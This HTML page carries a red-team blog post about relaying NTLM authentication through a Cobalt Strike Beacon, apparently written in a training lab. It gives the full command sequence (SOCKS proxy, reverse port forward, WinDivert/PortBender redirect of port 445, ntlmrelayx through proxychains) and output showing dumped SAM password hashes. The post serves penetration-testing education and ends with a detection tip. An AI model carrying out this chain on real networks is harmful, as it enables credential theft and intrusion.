<!DOCTYPE html>
<html lang="en">
<head>

    <title>NTLM Relaying via Cobalt Strike</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <link rel="preload" as="style" href="https://rastamouse.me/assets/built/screen.css?v=fc3066b784">
    <link rel="preload" as="script" href="https://rastamouse.me/assets/built/source.js?v=fc3066b784">
    
    <link rel="preload" as="font" type="font/woff2" href="https://rastamouse.me/assets/fonts/inter-roman.woff2?v=fc3066b784" crossorigin="anonymous">
<style>
    @font-face {
        font-family: "Inter";
        font-style: normal;
        font-weight: 100 900;
        font-display: optional;
        src: url(https://rastamouse.me/assets/fonts/inter-roman.woff2?v=fc3066b784) format("woff2");
        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }
</style>

    <link rel="stylesheet" type="text/css" href="https://rastamouse.me/assets/built/screen.css?v=fc3066b784">

    <style>
        :root {
            --background-color: #ffffff
        }
    </style>

    <script>
        /* The script for calculating the color contrast has been taken from
        https://gomakethings.com/dynamically-changing-the-text-color-based-on-background-color-contrast-with-vanilla-js/ */
        var accentColor = getComputedStyle(document.documentElement).getPropertyValue('--background-color');
        accentColor = accentColor.trim().slice(1);

        if (accentColor.length === 3) {
            accentColor = accentColor[0] + accentColor[0] + accentColor[1] + accentColor[1] + accentColor[2] + accentColor[2];
        }

        var r = parseInt(accentColor.substr(0, 2), 16);
        var g = parseInt(accentColor.substr(2, 2), 16);
        var b = parseInt(accentColor.substr(4, 2), 16);
        var yiq = ((r * 299) + (g * 587) + (b * 114)) / 1000;
        var textColor = (yiq >= 128) ? 'dark' : 'light';

        document.documentElement.className = `has-${textColor}-text`;
    </script>

    <link rel="canonical" href="https://rastamouse.me/ntlm-relaying-via-cobalt-strike/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Rasta Mouse">
    <meta property="og:type" content="article">
    <meta property="og:title" content="NTLM Relaying via Cobalt Strike">
    <meta property="og:description" content="NTLM relaying is a popular attack strategy during a penetration test and is really trivial to perform. Just roll up at the client site, plug your laptop into the LAN, fire up responder and ntlmrelayx, and away you go.





The majority of opportunistic relays come when a user or a">
    <meta property="og:url" content="https://rastamouse.me/ntlm-relaying-via-cobalt-strike/">
    <meta property="og:image" content="https://static.ghost.org/v5.0.0/images/publication-cover.jpg">
    <meta property="article:published_time" content="2021-07-29T12:50:18.000Z">
    <meta property="article:modified_time" content="2024-11-30T02:00:59.000Z">
    <meta property="article:tag" content="cobalt-strike">
    <meta property="article:tag" content="ntlm-relay">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="NTLM Relaying via Cobalt Strike">
    <meta name="twitter:description" content="NTLM relaying is a popular attack strategy during a penetration test and is really trivial to perform. Just roll up at the client site, plug your laptop into the LAN, fire up responder and ntlmrelayx, and away you go.





The majority of opportunistic relays come when a user or a">
    <meta name="twitter:url" content="https://rastamouse.me/ntlm-relaying-via-cobalt-strike/">
    <meta name="twitter:image" content="https://static.ghost.org/v5.0.0/images/publication-cover.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Rasta Mouse">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="cobalt-strike, ntlm-relay">
    <meta name="twitter:site" content="@_RastaMouse">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="840">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Rasta Mouse",
        "url": "https://rastamouse.me/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://rastamouse.me/favicon.ico",
            "width": 48,
            "height": 48
        }
    },
    "author": {
        "@type": "Person",
        "name": "Rasta Mouse",
        "image": {
            "@type": "ImageObject",
            "url": "https://www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=250&r=x&d=mp",
            "width": 250,
            "height": 250
        },
        "url": "https://rastamouse.me/author/rasta/",
        "sameAs": []
    },
    "headline": "NTLM Relaying via Cobalt Strike",
    "url": "https://rastamouse.me/ntlm-relaying-via-cobalt-strike/",
    "datePublished": "2021-07-29T12:50:18.000Z",
    "dateModified": "2024-11-30T02:00:59.000Z",
    "keywords": "cobalt-strike, ntlm-relay",
    "description": "\n\n\nNTLM relaying is a popular attack strategy during a penetration test and is really trivial to perform. Just roll up at the client site, plug your laptop into the LAN, fire up responder and ntlmrelayx, and away you go.\n\n\n\n\n\nThe majority of opportunistic relays come when a user or a machine tries to access an SMB resource that doesnâ€™t exist. It therefore sends broadcast requests which tools like responder will send poisoned responses for. There are tactics to coerce requests that specifically t",
    "mainEntityOfPage": "https://rastamouse.me/ntlm-relaying-via-cobalt-strike/"
}
    </script>

    <meta name="generator" content="Ghost 5.105">
    <link rel="alternate" type="application/rss+xml" title="Rasta Mouse" href="https://rastamouse.me/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/sodo-search.min.js" data-key="2d4823de33cae1902807c35c38" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/main.css" data-sodo-search="https://rasta-mouse.ghost.io/" data-locale="en" crossorigin="anonymous"></script>
    
    <link href="https://rastamouse.me/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=fc3066b784"></script><style>:root {--ghost-accent-color: #19a6ff;}</style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=fc3066b784">
    <script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js" defer></script>
<script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/autoloader/prism-autoloader.min.js" defer></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism-tomorrow.min.css">

</head>
<body class="post-template tag-cobalt-strike tag-ntlm-relay has-sans-title has-sans-body">

<div class="gh-viewport">
    
    <header id="gh-navigation" class="gh-navigation is-middle-logo gh-outer">
    <div class="gh-navigation-inner gh-inner">

        <div class="gh-navigation-brand">
            <a class="gh-navigation-logo is-title" href="https://rastamouse.me">
                    Rasta Mouse
            </a>
            <button class="gh-search gh-icon-button" aria-label="Search this site" data-ghost-search>
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>            <button class="gh-burger gh-icon-button" aria-label="Menu">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128ZM40,72H216a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16ZM216,184H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Z"></path></svg>                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M205.66,194.34a8,8,0,0,1-11.32,11.32L128,139.31,61.66,205.66a8,8,0,0,1-11.32-11.32L116.69,128,50.34,61.66A8,8,0,0,1,61.66,50.34L128,116.69l66.34-66.35a8,8,0,0,1,11.32,11.32L139.31,128Z"></path></svg>            </button>
        </div>

        <nav class="gh-navigation-menu">
            <ul class="nav">
    <li class="nav-home"><a href="https://rastamouse.me/">Home</a></li>
</ul>

        </nav>

        <div class="gh-navigation-actions">
                    <button class="gh-search gh-icon-button" aria-label="Search this site" data-ghost-search>
    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>        </div>

    </div>
</header>

    

<main class="gh-main">

    <article class="gh-article post tag-cobalt-strike tag-ntlm-relay no-image">

        <header class="gh-article-header gh-canvas">

                <a class="gh-article-tag" href="https://rastamouse.me/tag/cobalt-strike/">cobalt-strike</a>
            <h1 class="gh-article-title is-title">NTLM Relaying via Cobalt Strike</h1>

            <div class="gh-article-meta">
                <div class="gh-article-author-image instapaper_ignore">
                            <a href="/author/rasta/">
                                <img class="author-profile-image" src="https://www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s&#x3D;250&amp;r&#x3D;x&amp;d&#x3D;mp" alt="Rasta Mouse">
                            </a>
                </div>
                <div class="gh-article-meta-wrapper">
                    <h4 class="gh-article-author-name"><a href="/author/rasta/">Rasta Mouse</a></h4>
                    <div class="gh-article-meta-content">
                        <time class="gh-article-meta-date" datetime="2021-07-29">29 Jul 2021</time>
                            <span class="gh-article-meta-length"><span class="bull">â€”</span> 4 min read</span>
                    </div>
                </div>
            </div>

            
        </header>

        <section class="gh-content gh-canvas is-body drop-cap">
            <!--kg-card-begin: html-->
<p>NTLM relaying is a popular attack strategy during a penetration test and is really trivial to perform.  Just roll up at the client site, plug your laptop into the LAN, fire up responder and ntlmrelayx, and away you go.</p>



<p>The majority of opportunistic relays come when a user or a machine tries to access an SMB resource that doesn&#8217;t exist. It therefore sends broadcast requests which tools like responder will send poisoned responses for.  There are tactics to coerce requests that specifically target the address you&#8217;re listening on.  For instance &#8211; create a Windows shortcut with the icon set to a UNC path (e.g. <em>\\attacker-ip\pwn.icon</em>), place it in a network share and wait for a user to browse that share.  And there are also services that are vulnerable to relaying in their default configuration, such as <a rel="noreferrer noopener" href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" data-type="URL" data-id="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank">Active Directory Certificate Services</a>.</p>



<p>It&#8217;s probably safe to say that NTLM relaying isn&#8217;t going to vanish anytime soon.  However, relaying through a C2 framework is a bit less trivial for a few reasons.  Assuming  you&#8217;ve compromised a Windows endpoint:</p>



<ul><li>Port 445 is already bound by the OS, so you can&#8217;t simply sniff incoming traffic.</li><li>The popular Python tools won&#8217;t run natively on Windows.</li></ul>



<p>This second point is easy to solve, we can just run them on a local Linux VM or WSL, and tunnel the traffic to it.  Redirecting the incoming traffic on port 445 is the slightly tricky part, but is possible using a tool such as <a rel="noreferrer noopener" href="https://github.com/basil00/Divert" data-type="URL" data-id="https://github.com/basil00/Divert" target="_blank">WinDivert</a>.  This is a driver (yes, a driver) which is capable of intercepting and redirecting incoming network packets before they can hit the underlying services.</p>



<p>There are multiple projects out there that leverage WinDivert to achieve this style of traffic redirection in post-ex tools, including <a rel="noreferrer noopener" href="https://github.com/Arno0x/DivertTCPconn" data-type="URL" data-id="https://github.com/Arno0x/DivertTCPconn" target="_blank">DivertTCPconn</a>, <a rel="noreferrer noopener" href="https://github.com/jellever/StreamDivert" data-type="URL" data-id="https://github.com/jellever/StreamDivert" target="_blank">StreamDivert</a>, and <a rel="noreferrer noopener" href="https://github.com/praetorian-inc/PortBender" data-type="URL" data-id="https://github.com/praetorian-inc/PortBender" target="_blank">PortBender</a>.  DivertTCPconn &amp; StreamDivert compile to an EXE and PortBender to a reflective DLL.  Both are generic enough implementations that can be run via practically any C2 framework, though PortBender has the added perk of including an Aggressor Script.</p>



<p>These tools allow us to direct traffic incoming on port 445 to another, arbitrary local port.  On this port, we can start a reverse port forward which will redirect the traffic again to a location where the relay tools are running.</p>



<p>Cobalt Strike does have an <strong>rportfwd </strong>command, which will bind a port on the compromised machine, tunnel that traffic back to the team server, and forward it to the specified IP and port.  The inconvenience is that it requires that your relaying tools are running on either the team server itself, or on another machine that is routable from the team server.</p>



<p>The <strong>rportfwd_local</strong> command differs in that instead of tunnelling the traffic only as far as the team server, it will be forwarded to the machine running the Cobalt Strike client of the operator who started it.  This means that you can run the relaying tools in a VM or in WSL of your own machine.  Baller.</p>



<p>Finally, for the relaying tool to send traffic back into the target network, we can just use the <strong>socks </strong>command.</p>



<p>The traffic flow will look something like this:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="629" height="741" src="https://i0.wp.com/rastamouse.me/wp-content/uploads/2021/07/traffic-flow.png?resize=629%2C741&#038;ssl=1" alt="" class="wp-image-440" srcset="https://i0.wp.com/18.134.88.235/wp-content/uploads/2021/07/traffic-flow.png?w=629 629w, https://i0.wp.com/18.134.88.235/wp-content/uploads/2021/07/traffic-flow.png?resize=255%2C300 255w" sizes="(max-width: 629px) 100vw, 629px" data-recalc-dims="1" /></figure>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<p>Pretty trippy.  Let&#8217;s see it in action.</p>



<p>I generally set the attack up in reverse order.  You want everything up and running before the traffic is redirected so you don&#8217;t miss anything.</p>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<ol><li>Start the SOCKS proxy.</li></ol>



<pre class="wp-block-code"><code class="">beacon&gt; socks 1080
[+] started SOCKS4a server on: 1080</code></pre>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<p>2. Run ntlmrelayx inside proxychains.  In this example, 10.10.17.68 is the target machine.</p>



<pre class="wp-block-code"><code class="">root@Ghost-Canyon:~# proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68
-smb2support

[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections</code></pre>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<p>3. Start the reverse port forward on the same machine that will run PortBender.  172.20.77.73 is the IP address that my WSL Ubuntu image has.</p>



<pre class="wp-block-code"><code class="">beacon&gt; rportfwd_local 8445 172.20.77.73 445
[+] started reverse port forward on 8445 to rasta -&gt; 172.20.77.73:445
</code></pre>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<p>4. Upload WinDivert64.sys (or WinDiver32.sys depending on the target arch), and then run PortBender.</p>



<p>Local admin access is required to load the driver, so this Beacon is running as SYSTEM.</p>



<pre class="wp-block-code"><code class="">beacon&gt; getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon&gt; pwd
[*] Current directory is C:\Windows\system32\drivers

beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys

beacon&gt; PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP</code></pre>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<p>When port 445 receives a connection, PortBender will report it in the Beacon console.  When this happens, check ntlmrelayx!</p>



<pre class="wp-block-code"><code class="">New connection from 10.10.17.132:49937 to 10.10.17.25:445
Disconnect from 10.10.17.132:49937 to 10.10.17.25:445
</code></pre>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<p>As expected, the traffic has been tunnelled all the way to my WSL instance where ntlmrelayx is listening; and it has relayed the traffic to the target machine back on the internal network.  By default, it dumps the local SAM database.</p>



<pre class="wp-block-code"><code class="">[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from DEV/NLAMB@172.20.64.1 controlled, attacking target smb://10.10.17.68
|S-chain|-&lt;&gt;-10.10.5.120:1080-&lt;&gt;&lt;&gt;-10.10.17.68:445-&lt;&gt;&lt;&gt;-OK
[*] Authenticating against smb://10.10.17.68 as DEV/NLAMB SUCCEED
[*] SMBD-Thread-4: Connection from DEV/NLAMB@172.20.64.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x20c5ee68f38fa77abdb7912a6dcc042a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b423cdd3ad21718de4490d9344afef72:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Done dumping SAM hashes for host: 10.10.17.68
[*] Stopping service RemoteRegistry</code></pre>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<div style="height:10px" aria-hidden="true" class="wp-block-spacer"></div>



<p>To stop PortBender, use the <strong>jobs </strong>command to list the running job.  This will give you the job ID (JID) and an associated PID.  <strong>Use jobkill &lt;jid></strong> to stop the job, and then <strong>kill &lt;pid></strong> to close the spawned process.</p>



<p>As well as the usual MS guidance for NTLM relay mitigation, one may wish to look for the WinDivert driver load events (Sysmon Event ID 6).</p>



<p>This blog post was written using the lab from my <a href="https://www.zeropointsecurity.co.uk/red-team-ops" data-type="URL" data-id="https://www.zeropointsecurity.co.uk/red-team-ops" target="_blank" rel="noreferrer noopener">Red Team Ops course</a>.</p>
<!--kg-card-end: html-->
        </section>

    </article>


</main>


            <section class="gh-container is-grid gh-outer">
                <div class="gh-container-inner gh-inner">
                    <h2 class="gh-container-title">Read more</h2>
                    <div class="gh-feed">
                            <article class="gh-card post no-image no-image">
    <a class="gh-card-link" href="/cobalt-strike-postex-kit/">
        <div class="gh-card-wrapper">
            <h3 class="gh-card-title is-title">Cobalt Strike Postex Kit</h3>
                    <p class="gh-card-excerpt is-body">The CS 4.10 update saw the introduction of the Postex Kit. This was a bit overshadowed by BeaconGate, which was also added in 4.10 (I wrote about this in my last post). The intention of this post is to highlight what this kit is about and how it</p>
            <footer class="gh-card-meta">
<!--
             -->                    <time class="gh-card-date" datetime="2024-12-08">08 Dec 2024</time>
                <!--
         --></footer>
        </div>
    </a>
</article>
                            <article class="gh-card post no-image no-image">
    <a class="gh-card-link" href="/udrl-sleepmask-and-beacongate/">
        <div class="gh-card-wrapper">
            <h3 class="gh-card-title is-title">UDRL, SleepMask, and BeaconGate</h3>
                    <p class="gh-card-excerpt is-body">I&#39;ve been looking into Cobalt Strike&#39;s UDRL, SleepMask, and BeaconGate features over the last couple of days. It took me some time to understand the relationship between these capabilities, so the aim of this post is to provide a concise overview for those looking into these</p>
            <footer class="gh-card-meta">
<!--
             -->                    <time class="gh-card-date" datetime="2024-11-30">30 Nov 2024</time>
                <!--
         --></footer>
        </div>
    </a>
</article>
                            <article class="gh-card post no-image no-image">
    <a class="gh-card-link" href="/crystal-malware/">
        <div class="gh-card-wrapper">
            <h3 class="gh-card-title is-title">Crystal Malware</h3>
                    <p class="gh-card-excerpt is-body">I enjoy learning about new programming languages, so I decided to have a look at Crystal - a general purpose, object-oriented language. Unfortunately, the title is complete clickbait - this will just be a short post about my first impressions of the language and some of the things I found</p>
            <footer class="gh-card-meta">
<!--
             -->                    <time class="gh-card-date" datetime="2024-08-01">01 Aug 2024</time>
                <!--
         --></footer>
        </div>
    </a>
</article>
                            <article class="gh-card post no-image no-image">
    <a class="gh-card-link" href="/kerberos-delegation-test-app/">
        <div class="gh-card-wrapper">
            <h3 class="gh-card-title is-title">Kerberos Delegation Test App</h3>
                    <p class="gh-card-excerpt is-body">I have been quietly working on some new Kerberos course content, and although itâ€™s not complete yet, I wanted to take a small segue to write this post. My approach to tackling the content required capturing and decrypting legitimate Kerberos traffic on the wire, so that readers could understand</p>
            <footer class="gh-card-meta">
<!--
             -->                    <time class="gh-card-date" datetime="2024-05-11">11 May 2024</time>
                <!--
         --></footer>
        </div>
    </a>
</article>
                    </div>
                </div>
            </section>

    
    <footer class="gh-footer gh-outer">
    <div class="gh-footer-inner gh-inner">

        <div class="gh-footer-bar">
            <span class="gh-footer-logo is-title">
                    Rasta Mouse
            </span>
            <nav class="gh-footer-menu">
                <ul class="nav">
    <li class="nav-sign-up"><a href="#/portal/">Sign up</a></li>
</ul>

            </nav>
            <div class="gh-footer-copyright">
                Powered by <a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a>
            </div>
        </div>


    </div>
</footer>    
</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script src="https://rastamouse.me/assets/built/source.js?v=fc3066b784"></script>



</body>
</html>
